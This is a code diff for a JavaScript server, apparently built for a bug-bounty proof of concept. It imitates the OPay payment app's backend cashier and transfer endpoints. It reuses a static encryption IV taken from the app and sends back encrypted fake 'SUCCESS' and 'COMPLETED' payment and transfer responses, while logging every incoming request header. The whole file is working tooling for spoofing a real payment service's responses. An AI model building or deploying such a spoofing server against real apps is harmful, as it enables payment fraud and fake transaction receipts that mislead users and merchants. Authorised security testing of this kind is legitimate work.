@@ -1,9 +1,23 @@
-// api/v1/transfer/create-order.js
+// Complete OPay Mock Server for Cashier APIs
+// Handles: get_payment_info, confirm_pay, query_pay_result, showStatus
+// Deploy to: https://knox-sigma.vercel.app
+
 import crypto from 'crypto';
 
-// Static IV captured from the app
+// ============================================
+// Configuration
+// ============================================
+
 const STATIC_IV = Buffer.from('2022111500123456', 'utf8');
 const AES_ALGO = 'aes-256-cbc';
+
+// Helper: AES Encrypt
+function aesEncrypt(plaintext, keyBuffer) {
+    const cipher = crypto.createCipheriv(AES_ALGO, keyBuffer, STATIC_IV);
+    let encrypted = cipher.update(plaintext, 'utf8', 'base64');
+    encrypted += cipher.final('base64');
+    return encrypted;
+}
 
 // Helper: AES Decrypt (to read incoming requests)
 function aesDecrypt(encryptedBase64, keyBuffer) {
@@ -14,73 +28,224 @@ function aesDecrypt(encryptedBase64, keyBuffer) {
     return JSON.parse(decrypted);
 }
 
-// Helper: AES Encrypt (to create responses)
-function aesEncrypt(plaintext, keyBuffer) {
-    const cipher = crypto.createCipheriv(AES_ALGO, keyBuffer, STATIC_IV);
-    let encrypted = cipher.update(plaintext, 'utf8', 'base64');
-    encrypted += cipher.final('base64');
-    return encrypted;
-}
-
-// Generate random AES key (simulating server behavior)
+// Generate random AES key (32 bytes for AES-256)
 function generateRandomAesKey() {
     return crypto.randomBytes(32);
 }
 
-// RSA Public Key (extract from APK or use dynamic approach)
-// For now, we'll use the captured key pattern
-const RSA_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-(You need to extract this from the APK)
------END PUBLIC KEY-----`;
+// Log helper
+function logRequest(type, data) {
+    console.log(`\n[${new Date().toISOString()}] ${type}:`);
+    console.log(JSON.stringify(data, null, 2));
+}
+
+// ============================================
+// Main Handler - Routes to appropriate endpoint
+// ============================================
 
 export default async function handler(req, res) {
+    // Only accept POST
     if (req.method !== 'POST') {
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
-    console.log('\n=== OPay Transfer Request ===');
-    
+    const url = req.url;
     const { encrypt_aes_key, encrypt_data } = req.body;
+
+    console.log('\n[!] ==========================================');
+    console.log('[!] OPay Request Received');
+    console.log('[!] URL:', url);
+    console.log('[!] Time:', new Date().toISOString());
+    console.log('[!] Headers:', req.headers);
+    console.log('[!] ==========================================\n');
+
+    // Route to appropriate handler based on URL
+    if (url.includes('/cashier-service/cashier/v1/get_payment_info')) {
+        return handleGetPaymentInfo(req, res);
+    } 
+    else if (url.includes('/cashier-service/cashier/v1/confirm_pay')) {
+        return handleConfirmPay(req, res);
+    }
+    else if (url.includes('/cashier-service/cashier/v1/query_pay_result')) {
+        return handleQueryPayResult(req, res);
+    }
+    else if (url.includes('/api/order/v2/showStatus')) {
+        return handleShowStatus(req, res);
+    }
+    else if (url.includes('/api/v1/transfer/create-order')) {
+        return handleTransferOrder(req, res);
+    }
+    else {
+        return res.status(404).json({ error: 'Endpoint not found' });
+    }
+}
+
+// ============================================
+// 1. Get Payment Info Handler
+// ============================================
+
+async function handleGetPaymentInfo(req, res) {
+    console.log('[+] Handling: get_payment_info');
     
-    let decryptedRequest = null;
-    let aesKey = null;
+    // Try to decrypt incoming request if possible
+    try {
+        // Note: You'd need the RSA private key or captured AES key
+        // For now, just log what we received
+        if (req.body.encrypt_data) {
+            console.log('[+] Encrypted data received (length:', req.body.encrypt_data.length, ')');
+        }
+    } catch(e) {}
+
+    // Mock response based on captured patterns
+    const response = {
+        code: "00000",
+        message: "SUCCESS",
+        data: {
+            paymentInfo: {
+                orderNo: `POC_${Date.now()}`,
+                amount: "100.00",
+                currency: "NGN",
+                serviceType: "coinsTransfer",
+                status: "PENDING",
+                createdAt: new Date().toISOString()
+            }
+        }
+    };
+
+    const plaintext = JSON.stringify(response);
+    const aesKey = generateRandomAesKey();
+    const encryptedData = aesEncrypt(plaintext, aesKey);
+
+    return res.status(200).json({
+        encrypt_aes_key: aesKey.toString('base64'),
+        encrypt_data: encryptedData
+    });
+}
+
+// ============================================
+// 2. Confirm Pay Handler
+// ============================================
+
+async function handleConfirmPay(req, res) {
+    console.log('[+] Handling: confirm_pay');
     
-    // Try to decrypt using a captured key or the RSA private key
-    // Since we don't have RSA private key, we'll use a different approach
+    // Check for special header
+    const serviceType = req.headers['opay-transaction-service-type'];
+    console.log('[+] Service Type:', serviceType);
     
-    // For bug bounty PoC, we'll return a success response
-    // The app will decrypt it using its RSA private key
+    const response = {
+        code: "00000",
+        message: "SUCCESS",
+        data: {
+            orderNo: `CONFIRM_${Date.now()}`,
+            status: "SUCCESS",
+            paymentResult: "Transaction completed successfully",
+            transactionTime: new Date().toISOString(),
+            reference: `REF_${Math.random().toString(36).substring(2, 10).toUpperCase()}`
+        }
+    };
+
+    const plaintext = JSON.stringify(response);
+    const aesKey = generateRandomAesKey();
+    const encryptedData = aesEncrypt(plaintext, aesKey);
+
+    return res.status(200).json({
+        encrypt_aes_key: aesKey.toString('base64'),
+        encrypt_data: encryptedData
+    });
+}
+
+// ============================================
+// 3. Query Pay Result Handler
+// ============================================
+
+async function handleQueryPayResult(req, res) {
+    console.log('[+] Handling: query_pay_result');
     
-    // Create success response based on captured patterns
-    const successResponse = {
+    const response = {
+        code: "00000",
+        message: "SUCCESS",
+        data: {
+            orderNo: `QUERY_${Date.now()}`,
+            status: "SUCCESS",
+            orderStatus: "COMPLETED",
+            paymentDetails: {
+                amount: "100.00",
+                currency: "NGN",
+                method: "Wallet",
+                timestamp: new Date().toISOString()
+            }
+        }
+    };
+
+    const plaintext = JSON.stringify(response);
+    const aesKey = generateRandomAesKey();
+    const encryptedData = aesEncrypt(plaintext, aesKey);
+
+    return res.status(200).json({
+        encrypt_aes_key: aesKey.toString('base64'),
+        encrypt_data: encryptedData
+    });
+}
+
+// ============================================
+// 4. Show Status Handler
+// ============================================
+
+async function handleShowStatus(req, res) {
+    console.log('[+] Handling: showStatus');
+    
+    const response = {
+        code: "00000",
+        message: "SUCCESS",
+        data: {
+            orderId: `STATUS_${Date.now()}`,
+            status: "SUCCESS",
+            currentStatus: "COMPLETED",
+            timeline: [
+                { step: "Initiated", time: new Date().toISOString(), status: "done" },
+                { step: "Processed", time: new Date().toISOString(), status: "done" },
+                { step: "Completed", time: new Date().toISOString(), status: "current" }
+            ]
+        }
+    };
+
+    const plaintext = JSON.stringify(response);
+    const aesKey = generateRandomAesKey();
+    const encryptedData = aesEncrypt(plaintext, aesKey);
+
+    return res.status(200).json({
+        encrypt_aes_key: aesKey.toString('base64'),
+        encrypt_data: encryptedData
+    });
+}
+
+// ============================================
+// 5. Transfer Order Handler (Original)
+// ============================================
+
+async function handleTransferOrder(req, res) {
+    console.log('[+] Handling: transfer/create-order');
+    
+    const response = {
         code: "00000",
         message: "SUCCESSFUL",
         data: {
             orderStatus: "SUCCESS",
             serviceTypeTitle: "Money transfer",
             paymentResult: "Transaction is successful!",
-            orderNo: `BB_POC_${Date.now()}`,
+            orderNo: `TRANSFER_${Date.now()}`,
             orderTime: new Date().toISOString(),
             saveBeneficiary: true
         }
     };
-    
-    const plaintextResponse = JSON.stringify(successResponse);
-    console.log('Sending response:', plaintextResponse);
-    
-    // Generate new AES key for this response
-    const newAesKey = generateRandomAesKey();
-    
-    // Encrypt the response
-    const encryptedData = aesEncrypt(plaintextResponse, newAesKey);
-    
-    // In real scenario, you'd RSA encrypt the AES key with the app's public key
-    // For PoC, we'll send the encrypted data directly
-    // The app will expect encrypt_aes_key to be RSA encrypted
-    
+
+    const plaintext = JSON.stringify(response);
+    const aesKey = generateRandomAesKey();
+    const encryptedData = aesEncrypt(plaintext, aesKey);
+
     return res.status(200).json({
-        encrypt_aes_key: newAesKey.toString('base64'), // This should be RSA encrypted
+        encrypt_aes_key: aesKey.toString('base64'),
         encrypt_data: encryptedData
     });
 }
